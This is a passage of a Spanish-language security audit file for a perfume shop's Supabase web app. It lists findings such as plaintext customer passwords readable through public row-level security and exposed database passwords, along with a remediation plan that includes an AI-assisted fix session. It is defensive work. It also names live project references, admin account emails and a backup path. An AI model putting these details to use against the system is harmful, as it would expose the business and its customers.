- Cambiar `notifyTelegram` a `fetch` directo desde frontend (riesgo: token expuesto · ver S3 · se decidirá en `[SECURITY-AUDIT-S1]`)
- O diagnosticar y arreglar config de pg_net

---

## ✅ Lo que SÍ está OK (no tocar a la ligera)

| Cosa | Estado |
|---|---|
| Auth de admin via Supabase Auth | ✓ Funciona post Plan B (hashes bcrypt preservados) |
| RLS pública en tablas (`select_public USING true`) | ⚠️ Configurado en las 28 tablas · OK para el catálogo, **pero en `clientes` filtra teléfonos + passwords en plano a `anon`** (ver addendum de S2) · NO es "OK" para esa tabla |
| RLS escritura `auth.role() = 'authenticated'` | ✓ Configurado |
| Service role keys NO en frontend | ✓ Solo en env vars o `.env` local (borrado) |
| HTTPS en producción | ✓ Vercel auto |
| Storage CDN cache | ✓ 1 semana (`[CACHE-CONTROL-1W]`) |
| Service Worker · no cachea Supabase API | ✓ Configurado (`network-only` para `*.supabase.co`) |

---

## 📋 Estado actual del proyecto post-Plan-B

| Item | Detalles |
|---|---|
| **Proyecto Supabase activo** | sa-east-1 São Paulo · ref `znmjhproimtprptheumy` |
| **Proyecto Supabase legacy** | us-west-2 Oregon · ref `rtgjzzkjrwbkdhkslxix` · activo hasta 28-may como rollback |
| **Anon key activa** | `sb_publishable_Bb4Jo74f4Wh7vhz...` (nuevo formato Supabase, ~46 chars) |
| **DB password expuesta** | ⚠️ Sí · ambas en chat de esta sesión. Reset pendiente |
| **Bot Telegram token** | **Rotado el 19-sep-2026 y verificado por entrega (`200` en `pg_net`)** · el del 17-sep quedó mal pegado (404, nada se entregó ~31 h) y además salió en una captura → rotado de nuevo · vive sólo en `public.send_telegram` · `anon` sin EXECUTE (S14 ✅) · pendiente Vault |
| **Service role keys** | NUNCA en repo · estuvieron en `D:\tmp\.env` (borrado) |
| **Backup dump pre-migración** | `D:\backups\st-perfumeria-pre-migracion-20may2026.sql` · 6.2 MB · conservar 7 días · contiene passwords en plano de clientes |

---

## 📅 Plan de acción priorizado · `[SECURITY-AUDIT-S1]`

**Próxima sesión (1-2 días desde hoy):**

1. **Sesión Claude↔Claude:**
   - Alejo abre ClaudeChat con este SECURITY.md como contexto
   - ClaudeChat hace análisis profundo y propone plan de fix para cada issue (priorizado)
   - ClaudeChat escribe `Prompt_para_ClaudeCode_SECURITY_AUDIT_S1.md` (similar al de Plan B)
   - Alejo valida el plan
   - Claude Code ejecuta paso a paso con disciplina

2. **Fix orden recomendado:**
   - 🔴 **S1 primero** (passwords hardcoded admin) · cualquier hora · 30 min
   - 🟡 **S3 después** (rotar bot token Telegram) · 15 min
   - 🟡 **S5** (rotar DB passwords expuestas) · 5 min cada una
   - ✅ ~~**S2 (BCRYPT-MIGRATION)**~~ · **RESUELTO 17-sep-2026** (`98b556c` + FASE 1/3) · ver § S2
   - 🟡 **S4** se resuelve automáticamente al bajar proyecto viejo el 28-may
   - 🟢 **S8** (storage policies) · puede ir junto con BCRYPT-MIGRATION

3. **Verificación post-fix:**
   - Test E2E del admin con las passwords nuevas
   - Test E2E del frontend público
   - Confirmar que `notifyTelegram` sigue funcionando con el token nuevo (o ya con el workaround del `[FIX-TELEGRAM-PG-NET]`)
   - Revisar logs de Vercel y Supabase por errors anómalos

---

## 🚨 Acciones URGENTES Alejo puede hacer YA (sin sesión Claude)

Estas son cosas que podés hacer vos solo desde la UI · 5-10 min total:

1. **Cambiar password del jefe en `auth.users` del proyecto nuevo**:
   - `https://supabase.com/dashboard/project/znmjhproimtprptheumy/auth/users`
   - Click en `jefe@stperfumeria.local` → "..." → "Send password recovery" (no funciona porque no hay email real) → mejor: "Change password" directo · poner nueva
2. **Mismo para `empleado@stperfumeria.local`**
3. **Avisar a las chicas las passwords nuevas** por canal privado (WhatsApp directo, NO email)
4. **Resetear DB password de ambos proyectos** (Settings → Database → Reset) · ~30 seg cada uno
5. **Revocar bot Telegram con BotFather**:
   - Abrir Telegram → buscar `@BotFather`
   - `/mybots` → seleccionar tu bot ST Perfumería → "API Token" → "Revoke current token"
   - Te da un token nuevo · pegarlo en la función SQL `send_telegram` del proyecto nuevo (via SQL Editor)

Esto **mitiga 4 de los 6 issues críticos/altos** en 10 min de trabajo manual.

---

*Documento creado el 21-may-2026 · actualizar cada vez que se descubra/arregle un issue de seguridad · todos los keywords con corchetes deben estar también en HISTORIA.md*
